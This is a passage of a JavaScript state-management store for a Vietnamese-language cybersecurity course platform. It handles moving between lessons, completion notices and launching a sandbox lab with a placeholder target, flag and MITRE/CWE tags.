      })
    },

    closeLessonModal: () => {
      set({ activeLessonModal: null })
    },

    // Move to next lesson in modal
    nextLesson: async () => {
      const { activeLessonModal, completedLessons, toggleLesson, isLessonUnlocked } = get()
      if (!activeLessonModal) return

      const { course, lesson, lessonIndex } = activeLessonModal
      // Mark current as completed if not yet
      const currentDone = completedLessons[course.id] || []
      if (!currentDone.includes(lesson.id)) {
        const success = await toggleLesson(course.id, lesson.id)
        if (!success) return
      }

      // If next lesson exists
      if (lessonIndex < course.syllabus.length - 1) {
        const nextIndex = lessonIndex + 1
        // Check if next is unlocked
        if (!isLessonUnlocked(course.id, nextIndex)) {
          useNotificationStore.getState().warning(
            "Bài Kế Tiếp Chưa Mở Khóa",
            "Bạn phải hoàn thành bài học hiện tại để mở khóa nội dung tiếp theo."
          )
          return
        }

        const nextTarget = course.syllabus[nextIndex]
        set({
          activeLessonModal: {
            course,
            lesson: nextTarget,
            lessonIndex: nextIndex,
          },
        })
      } else {
        // Course completed!
        useNotificationStore
          .getState()
          .success(
            "Chúc mừng tốt nghiệp khóa học!",
            `Bạn đã hoàn thành 100% giáo trình ${course.code}! Đủ điều kiện nhận Chứng chỉ số PGP.`
          )
      }
    },

    // Move to previous lesson in modal
    prevLesson: () => {
      const { activeLessonModal } = get()
      if (!activeLessonModal) return
      const { course, lessonIndex } = activeLessonModal
      if (lessonIndex > 0) {
        const prevIndex = lessonIndex - 1
        const prevTarget = course.syllabus[prevIndex]
        set({
          activeLessonModal: {
            course,
            lesson: prevTarget,
            lessonIndex: prevIndex,
          },
        })
      }
    },

    // Launch connected Sandbox Lab directly from a lesson
    launchLessonLab: (labId) => {
      const targetId = labId || "lab-01"
      const labStore = useLabStore.getState()
      const course = get().activeLessonModal?.course
      const lesson = get().activeLessonModal?.lesson
      const targetLab = {
        id: targetId,
        title: lesson ? `Thao Trường: ${lesson.title}` : (course?.title || "Mục Tiêu Diễn Tập Sandbox"),
        targetIp: "10.10.14.89",
        targetPort: "8080",
        flag: "FLAG{CYBER_RANGE_MISSION_SUCCESS}",
        points: 450,
        mitre: lesson?.mitre?.split(" - ")[0] || "T1190",
        tags: [lesson?.cve?.split(":")[0] || "CWE-89"],
      }
      labStore.startLab(targetLab)
      labStore.openTerminal()
      useNotificationStore
        .getState()
        .info(
          "Khởi động Cyber Range Sandbox",
          `Terminal máy ảo đã được cấp phát trên cổng mạng cô lập (Target: 10.10.14.89:8080).`
        )
    },
  }
})

export default useLearningStore
